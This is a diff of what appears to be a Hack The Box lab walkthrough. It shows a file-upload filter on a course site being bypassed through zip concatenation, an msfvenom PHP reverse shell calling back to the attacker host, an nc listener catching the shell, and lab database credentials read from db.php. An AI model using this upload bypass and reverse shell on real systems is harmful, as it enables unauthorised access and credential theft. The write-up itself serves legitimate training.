@@ -101,6 +101,8 @@ Nmap done: 1 IP address (1 host up) scanned in 95.35 seconds
 
 ## 2. Exploring the web site at `80`
 
+### 2.1. Register account
+
 The web site has user account function:
 
 ![](https://github.com/user-attachments/assets/251838ab-a158-4190-9cd8-5bd62e873fcf)
@@ -112,6 +114,8 @@ Registering as teacher requires verification, so let's register for a student ac
 Logging in with the newly registered account grants access to the courses:
 
 ![](https://github.com/user-attachments/assets/d55c64b3-f363-4419-acbc-e87073b5bbe8)
+
+### 2.2. Explore course upload
 
 Enroll on a course:
 
@@ -127,9 +131,136 @@ The site doesn't accept upload of files types other than those stated:
 
 ![](https://github.com/user-attachments/assets/bfd00c9e-5ce0-4297-8de8-38116ad72645)
 
-Attempting to upload php reverse shell that has the extension changed to `.pdf` doesn't work either:
+It also detects if it is able to open the uploaded file:
 
 ![](https://github.com/user-attachments/assets/7fdf53e1-2b73-4a78-9162-f28df56552ac)
+
+A proper pdf file uploaded:
+
+![](https://github.com/user-attachments/assets/02e3ff65-67ba-4c28-bc51-76f0bb4c7f76)
+
+The file is available at: `http://certificate.htb/static/uploads/<some-id>/<file>`:
+
+![](https://github.com/user-attachments/assets/45129e07-55f8-4e72-a16f-0fed75448172)
+
+### 2.3. Exploit course upload
+
+The site also accept zip files, let's try to use [zip concatenation](https://www.bleepingcomputer.com/news/security/hackers-now-use-zip-file-concatenation-to-evade-detection/) to evade the upload detection
+
+Generate php reverse shell and setup the zip concatenation:
+
+```console
+root@kali:~# mkdir payload && cd $_
+
+root@kali:~/payload# msfvenom -p php/reverse_php LHOST=10.10.14.6 LPORT=4444 -f raw -o malicious/reverse.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 2970 bytes
+Saved as: malicious/reverse.php
+
+root@kali:~/payload# ls -lR
+.:
+total 20
+drwxr-xr-x 2 root root  4096 Aug 30 09:07 malicious
+-rw-r--r-- 1 root root 15812 Aug 30 09:03 test.pdf
+
+./malicious:
+total 4
+-rw-r--r-- 1 root root 2970 Aug 30 09:07 reverse.php
+
+root@kali:~/payload# zip a.zip test.pdf
+  adding: test.pdf (deflated 22%)
+
+root@kali:~/payload# zip -r b.zip malicious
+  adding: malicious/ (stored 0%)
+  adding: malicious/reverse.php (deflated 69%)
+
+root@kali:~/payload# cat a.zip b.zip > upload.zip
+```
+
+The site unzipped the package and shows the link to the test.pdf: http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/test.pdf
+
+Let's see if the reverse shell works:
+
+```sh
+curl http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/malicious/reverse.php
+```
+
+And the reverse shell is hooked:
+
+```cmd
+root@kali:~# rlwrap nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.11.71] 61383
+whoami
+certificate\xamppuser
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7E12-22F9
+
+ Directory of C:\xampp\htdocs\certificate.htb\static\uploads\8ad6b1453a685cd6a629959dcfb5039d\malicious
+
+08/29/2025  06:07 PM    <DIR>          .
+08/29/2025  06:07 PM    <DIR>          ..
+08/29/2025  06:07 PM             2,970 reverse.php
+               1 File(s)          2,970 bytes
+               2 Dir(s)   4,372,664,320 bytes free
+```
+
+## 3. Exploring the database
+
+```cmd
+dir C:\xampp\htdocs\certificate.htb\
+ Volume in drive C has no label.
+ Volume Serial Number is 7E12-22F9
+
+ Directory of C:\xampp\htdocs\certificate.htb
+
+12/30/2024  03:04 PM    <DIR>          .
+12/30/2024  03:04 PM    <DIR>          ..
+12/24/2024  01:45 AM             7,179 about.php
+12/30/2024  02:50 PM            17,197 blog.php
+12/30/2024  03:02 PM             6,560 contacts.php
+12/24/2024  07:10 AM            15,381 course-details.php
+12/24/2024  01:53 AM             4,632 courses.php
+12/23/2024  05:46 AM               549 db.php
+12/22/2024  11:07 AM             1,647 feature-area-2.php
+12/22/2024  11:22 AM             1,331 feature-area.php
+12/22/2024  11:16 AM             2,955 footer.php
+12/23/2024  06:13 AM             2,351 header.php
+12/24/2024  01:52 AM             9,497 index.php
+12/25/2024  02:34 PM             5,908 login.php
+12/23/2024  06:14 AM               153 logout.php
+12/24/2024  02:27 AM             5,321 popular-courses-area.php
+12/25/2024  02:27 PM             8,240 register.php
+12/26/2024  02:49 AM    <DIR>          static
+12/29/2024  12:26 AM            10,366 upload.php
+              16 File(s)         99,267 bytes
+               3 Dir(s)   4,372,664,320 bytes free
+```
+
+```cmd
+type C:\xampp\htdocs\certificate.htb\db.php
+```
+
+```php
+<?php
+// Database connection using PDO
+try {
+    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
+    $db_user = 'certificate_webapp_user'; // Change to your DB username
+    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
+    $options = [
+        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+    ];
+    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
+} catch (PDOException $e) {
+    die('Database connection failed: ' . $e->getMessage());
+}
+?>
+```
 
 ## to be updated
 
